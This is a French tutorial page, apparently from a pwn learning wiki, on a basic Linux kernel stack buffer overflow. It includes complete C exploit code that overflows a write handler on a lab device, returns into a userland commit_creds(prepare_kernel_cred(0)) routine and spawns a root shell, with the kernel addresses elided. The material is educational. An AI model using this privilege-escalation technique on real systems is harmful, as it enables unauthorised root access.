# Buffer Overflow Basic

## Overview
Tout comme pour une exploitation de **BoF** en user-land, notre objectif va être d&#39;overwrite la return address de la fonction vulnérable pour prendre le contrôle du flow d&#39;exécution. 
On se place ici dans le cas où aucune protection n&#39;est présente au niveau du kernel. 
## Detail
Notre objectif lors de l&#39;exploitation d&#39;un buffer overflow en kernel-land est de réussir a exécuter du code user-land tout en profitant de l&#39;exécution de code kernel-land pour [élever nos privilèges](/MyLittlePwney/pwn/kernel/kernel-privesc).

Ainsi, un schéma d&#39;attaque classique nous donnerait :
1) Exploiter le buffer overflow.
2) Overwrite l&#39;adresse de retour de la fonction vulnérable par l&#39;adresse de la fonction *privesc()*.
	- *privesc()* passe les privilèges du process, lancé par notre binaire *exploit*, a root.
3) Maintenant qu&#39;on a des privilèges root, on peut lancer un *system(&#34;/bin/sh&#34;)*.
![task_struct](/MyLittlePwney/images/kernel_bof.png)
## Exploit
Pour implémenter cette attaque, on va se mettre dans le cas où on peut interagir avec une device, dont la propriété **write** fait appel à une fonction vulnérable à un buffer overflow. Ainsi, lorsque l&#39;on va *write()* plus de caractères qu&#39;attendu, on va overflow sur la stack kernel.

Pour exploiter cela, on va tout d&#39;abord devoir ouvrir la device pour interagir avec elle.
```c title:open_dev()
int global_fd;

void open_dev(){
  global_fd = open(&#34;/dev/vulnDevice&#34;, O_RDWR);
	if (global_fd &lt; 0){
		puts(&#34;[!] Failed to open device&#34;);
		exit(-1);
	} else {
      puts(&#34;[*] Opened device&#34;);
  }
}
```

Ensuite on va préparer notre fonction *privesc()* que l&#39;on va appeler une fois avoir pris le contrôle sur le flow d&#39;exécution côté kernel.

| Pour mieux comprendre le principe de l&#39;élévation de privilèges côté kernel, allez voir : [Kernel Privesc](/MyLittlePwney/pwn/kernel/kernel-privesc). |
| --- |

```c title:privesc()
unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

void privesc(){
  commit_creds = 0xc107...;
  prepare_kernel_cred = 0xc107...;
  commit_creds(prepare_kernel_cred(0));
}
```

Maintenant qu&#39;on a la fonction qui va nous permettre d&#39;élever nos privilèges, on va pouvoir overflow sur la stack kernel et rediriger le flow d&#39;exécution vers cette fonction.
```c title:overflow()
void overflow(){
  // Overlow at 64 bytes
  unsigned long long payload[17] = {0};
  payload[16] = (unsigned long)privesc;

  write(global_fd, payload, sizeof(payload));
}
```

Grâce à cet exploit, nous avons manipulé le kernel pour qu&#39;il passe le process spawn par *exploit* en tant que process root. Il ne nous reste plus qu&#39;à run un *system(&#34;/bin/sh&#34;)* pour obtenir un shell root.

En résumé, notre exploit final donne quelque chose comme :
```c title:exploit.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;

int global_fd;

unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

void open_dev(){
  global_fd = open(&#34;/dev/vulnDevice&#34;, O_RDWR);
	if (global_fd &lt; 0){
		puts(&#34;[!] Failed to open device&#34;);
		exit(-1);
	} else {
      puts(&#34;[*] Opened device&#34;);
  }
}

void privesc(){
  commit_creds = 0xc107...;
  prepare_kernel_cred = 0xc107...;
  commit_creds(prepare_kernel_cred(0));
}

void overflow(){
  unsigned long long payload[17] = {0};
  payload[16] = (unsigned long)privesc;
  write(global_fd, payload, sizeof(payload));
}

int main() {
  open_dev();
  overflow();
  system(&#34;/bin/sh&#34;);
  return 0;
}
```

---

> Author:   
> URL: http://my.littlepwney.fr/pwn/kernel/attacks/buffer-overflow-basic/  

